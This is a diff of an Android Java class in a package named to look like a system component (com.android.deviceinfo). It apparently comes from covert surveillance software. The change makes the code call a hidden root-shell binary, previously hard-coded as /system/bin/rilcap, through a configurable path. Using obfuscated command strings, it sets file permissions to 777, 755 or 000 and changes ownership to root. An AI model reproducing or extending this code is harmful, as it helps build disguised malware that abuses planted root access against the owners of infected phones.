@@ -18,6 +18,7 @@ import android.os.StatFs;
 
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
+import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DateTime;
 import com.android.deviceinfo.util.Utils;
@@ -251,20 +252,20 @@ public class Path {
 					return true;
 				}
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (unprotect): " + M.e("/system/bin/rilcap pzm 777 ") + " " + path);
+					Check.log(TAG + " (unprotect): " + Configuration.shellFile + M.e("  pzm 777 ") + " " + path);
 				}
 				// h_9=/system/bin/ntpsvd pzm 777
-				Runtime.getRuntime().exec(M.e("/system/bin/rilcap pzm 777 ") + " " + path);
+				Runtime.getRuntime().exec(Configuration.shellFile + M.e(" pzm 777 ") + " " + path);
 				Utils.sleep(200);
 			} else {
 				if (file.canRead()) {
 					return true;
 				}
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (unprotect): " + M.e("/system/bin/rilcap pzm 755 ") + " " + path);
+					Check.log(TAG + " (unprotect): " + Configuration.shellFile + M.e(" pzm 755 ") + " " + path);
 				}
 				// h_3=/system/bin/ntpsvd pzm 755
-				Runtime.getRuntime().exec(M.e("/system/bin/rilcap pzm 755 ") + " " + path);
+				Runtime.getRuntime().exec(Configuration.shellFile + M.e(" pzm 755 ") + " " + path);
 				Utils.sleep(200);
 			}
 
@@ -303,10 +304,10 @@ public class Path {
 	public static boolean lock(String path) {
 		try {
 			// h_10=/system/bin/ntpsvd pzm 000
-			Runtime.getRuntime().exec(M.e("/system/bin/rilcap pzm 000 ") + path);
+			Runtime.getRuntime().exec(Configuration.shellFile + M.e(" pzm 000 ") + path);
 
 			// h_11=/system/bin/ntpsvd fho root root
-			Runtime.getRuntime().exec(M.e("/system/bin/rilcap fho root root ") + path);
+			Runtime.getRuntime().exec(Configuration.shellFile + M.e(" fho root root ") + path);
 
 			return true;
 		} catch (IOException ex) {
